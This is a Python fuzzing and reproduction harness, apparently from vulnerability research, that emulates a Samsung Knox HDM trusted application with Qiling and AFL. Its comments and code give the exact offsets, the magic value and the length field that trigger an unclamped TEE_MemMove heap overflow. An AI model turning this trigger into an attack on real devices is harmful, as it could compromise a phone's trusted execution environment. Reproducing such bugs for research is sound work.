from .params import *
from qiling import Qiling
import struct, os

# === STZHDM-5 reproduction harness ==========================================
# Target: Samsung S24 Ultra (SM-S928B) Knox HDM QTEE TA, tz_hdm.ta.
#
# Staging model (see tz_hdm.json): the GP lifecycle is stubbed (returns
# TEE_SUCCESS) and InvokeCommand is pointed DIRECTLY at the app command handler
#   process_cmd@0x4dd0  (ABI: w0=cmd, x1=req, x2=resp).
# This is the function the real GP plumbing (CElfFile_invoke -> GPAppLib_handle-
# Request -> 0x480 thunk) calls, with the cmd id taken from req[0] and the
# request/response memrefs unpacked. We reproduce that call directly so we don't
# have to model the libcmnlib GPAppLib_handleRequest import.
#
# BUG (confirmed in binary): process_cmd cmd 15 (GET_REVOKE_LIST) -> jump-table
# handler @0x55c0 (log-only) -> generate_jws_response@0x4d0c with op=0 -> op=0
# misses the {2,3,5} early-return bitmask -> bl hdm_generate_response@0x9db0.
# There (x26 = req):
#   0x9e0c add x24, x26, #0x2218        ; SAK magic gate, req+0x2218
#   0x9e18 bl  is_sak_key(req+0x2218)   ; memcmp(req+0x2218, "SAK:", 4)==0 -> w23=1
#   0x9e68 bl  TEE_Malloc(0x1000)       ; dst = malloc(0x1000)  (asan-redzoned)
#   0x9e7c tbz w23,#0, skip             ; SAK matched -> fall through to copy
#   0x9e80 add x24, x26, #0x3218        ; len source = req+0x3218 (little-endian u32)
#   0x9e88 add x1,  x26, #0x221c        ; src = req+0x221c
#   0x9eac sub w2,  w11, #4             ; len = be32(req+0x3218) - 4   (NO clamp)
#   0x9eb0 bl  TEE_MemMove(dst, src, len) ; heap overflow of the 0x1000 chunk
#
# To trip it: req[0x2218..0x221c) = "SAK:", req[0x3218] (big-endian u32) > 0x1004.
# The MemMove then writes (len-4) attacker bytes from req+0x221c into a 0x1000
# heap chunk; asan's heap redzone (TEE_Malloc routes through the Python asan
# allocator) catches the write at offset 0x1000 -> CRASH_PC -> AFL crash.
#
# We craft req/resp in dedicated guest pages (mapped in init_fuzz) so we control
# the full 0x3220+ request layout, and override process_cmd's register ABI in
# place_input_callback.

AFL_EXIT = 0x13370          # the emulator's clean fuzz exit (start_fuzz/pivot2)
CMD_REVOKE_LIST = 15        # GET_REVOKE_LIST -> SAK fast-path

REQ_BASE  = 0x51000000      # request buffer (>= 0x4000 so src+len stays mapped)
REQ_SIZE  = 0x6000
RESP_BASE = 0x52000000      # response buffer (>= 0x2014: hdm_generate_response
RESP_SIZE = 0x8000          # zero-fills a 0x2000-byte JWS area at resp+0x14)

SAK_OFF   = 0x2218          # "SAK:" magic
SRC_OFF   = 0x221c          # copy source
LEN_OFF   = 0x3218          # big-endian u32 length

# Default overflow length: just over the 0x1000 dst so the OOB write lands on
# the asan redzone immediately (len-4 bytes copied). A larger value is also fine
# as long as src+ (len-4) stays inside REQ_SIZE.
DEFAULT_LEN = int(os.environ.get("HDM_LEN", str(0x1100)), 0) & 0xFFFFFFFF


def init_fuzz(emu, sid):
    ql = emu.ql
    for base, size, name in ((REQ_BASE, REQ_SIZE, "req"), (RESP_BASE, RESP_SIZE, "resp")):
        try:
            ql.mem.map(base, size, info=f"[hdm_sak] {name}")
        except Exception as e:
            ql.log.warning(f"[hdm_sak] map {name} @ {hex(base)}: {e}")
    print(f"[hdm_sak] init: req@{hex(REQ_BASE)} resp@{hex(RESP_BASE)}")


def _build_req(length, payload_byte=0x41):
    buf = bytearray(REQ_SIZE)
    # SAK magic at req+0x2218
    buf[SAK_OFF:SAK_OFF + 4] = b"SAK:"
    # payload bytes at src (req+0x221c) up to the copy span. NOTE: the length
    # field at +0x3218 sits only 0x1000 bytes above the source, so any copy that
    # overflows the 0x1000 dst (length-4 > 0x1000) intrinsically spans over
    # +0x3218 -- that's the bug's own geometry. We therefore stamp the length
    # field *after* the payload fill so the in-binary be32 read returns exactly
    # our requested length (and the OOB size the detector reports is length-4).
    span = min((length - 4) if length > 4 else 0, REQ_SIZE - SRC_OFF)
    for i in range(span):
        buf[SRC_OFF + i] = payload_byte
    # u32 length at req+0x3218 (stamped last so payload can't clobber it). The
    # in-binary ldrb/bfi assembly (0x9e90..0x9ea8) is byte[0]|byte[1]<<8|... =
    # LITTLE-endian (the S20 report's "big-endian" note is wrong; the OOB trips
    # regardless of endianness, but we stamp LE so the requested length is exact).
    struct.pack_into("<I", buf, LEN_OFF, length & 0xFFFFFFFF)
    return bytes(buf)


def place_input_callback(ql: Qiling, input: bytes, _: int):
    # AFL drives the length field across the FULL range [0 .. REQ_SIZE-SRC_OFF+4]
    # so the boundary at 0x1004 (the malloc(0x1000) size + the -4) is discoverable
    # rather than pre-baked: an all-zero seed -> length 0 (safe, no overflow),
    # and AFL finds the > 0x1004 overflow on its own. The cap keeps src+len-4
    # inside the request page (so the *read* stays mapped and we observe the
    # heap WRITE overflow, not a read fault). HDM_LEN env forces a fixed length
    # for deterministic single-seed repro.
    length = DEFAULT_LEN
    if "HDM_LEN" not in os.environ:
        v = struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else 0
        hi = (REQ_SIZE - SRC_OFF) + 4          # max length keeping src+len-4 mapped
        length = v % (hi + 1)

    req = _build_req(length)
    ql.mem.write(REQ_BASE, req)
    ql.mem.write(RESP_BASE, b"\x00" * RESP_SIZE)

    # keep the GP param machinery happy (unused: we override the ABI below)
    setup_params_fuzz(ql, CMD_REVOKE_LIST, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # process_cmd(w0=cmd, x1=req, x2=resp); return into the AFL exit sentinel.
    ql.arch.regs.x0 = CMD_REVOKE_LIST
    ql.arch.regs.x1 = REQ_BASE
    ql.arch.regs.x2 = RESP_BASE
    ql.arch.regs.x30 = AFL_EXIT

    print(f"[hdm_sak] cmd=15 SAK len=le32(req+0x3218)={length:#x} "
          f"-> TEE_MemMove(malloc(0x1000), req+0x221c, {length - 4:#x}) heap OOB")
    return True
